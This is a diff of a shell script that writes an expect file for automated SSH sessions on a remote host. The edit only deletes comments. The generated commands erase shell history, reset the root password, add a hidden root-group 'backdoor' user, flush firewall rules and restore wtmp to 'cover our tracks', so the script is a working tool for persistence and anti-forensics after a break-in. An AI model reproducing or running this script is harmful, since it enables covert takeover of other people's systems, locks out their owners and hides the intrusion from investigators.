@@ -75,7 +75,7 @@ expect {
 send "yes\n"
 exp_continue
 }
-set prompt ":|#|\\\$" #use correct prompt
+set prompt ":|#|\\\\\\$"
 interact -o -nobuffer -re \$prompt return
 send "$pass\r"
 LOGIN
@@ -90,15 +90,15 @@ fi
 
 /bin/cat<<MORE >> $expectFile
 interact -o -nobuffer -re \$prompt return
-send "history -d \`history | wc -l\`; /bin/sh\r" #make sure we don't leave a trail
+send "history -d \`history | wc -l\`; /bin/sh\r"
 interact -o -nobuffer -re \$prompt return
-send "echo -e \"$newRootPass\n$newRootPass\" | passwd\r" #change root password
+send "echo -e \"$newRootPass\n$newRootPass\" | passwd\r"
 interact -o -nobuffer -re \$prompt return
-send "useradd -g root -G sudo -o -u 250 $newUser\r" #add 'backdoor' user
+send "useradd -g root -G sudo -o -u 250 $newUser\r"
 interact -o -nobuffer -re \$prompt return
-send "echo -e \"$newPass\n$newPass\" | passwd\r" #change backdoor user's password
+send "echo -e \"$newPass\n$newPass\" | passwd\r"
 interact -o -nobuffer -re \$prompt return
-send "/usr/bin/env iptables -F || ipfw flush\r" #flush firewall rules
+send "/usr/bin/env iptables -F || ipfw flush\r"
 MORE
 
 if [ "$dropTables" == "yes" ]; then
@@ -133,14 +133,14 @@ fi
 
 if [ "$alterLastHistory" == "yes" ]; then
 	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
-	echo "send \"mv /var/log/wtmp.bak /var/log/wtmp\" #replace the wtmp file to cover our tracks" >> $expectFile
+	echo "send \"mv /var/log/wtmp.bak /var/log/wtmp\"" >> $expectFile
 fi
 
 /bin/cat <<BOTTOM >> $expectFile
 interact -o -nobuffer -re \$prompt return
-send "exit\r" #exit the sh and go back to original shell
+send "exit\r"
 interact -o -nobuffer -re \$prompt return
-send "history -d \`history | wc -l\`; exit\r" #exit ssh
+send "history -d \`history | wc -l\`; exit\r"
 interact
 BOTTOM
 
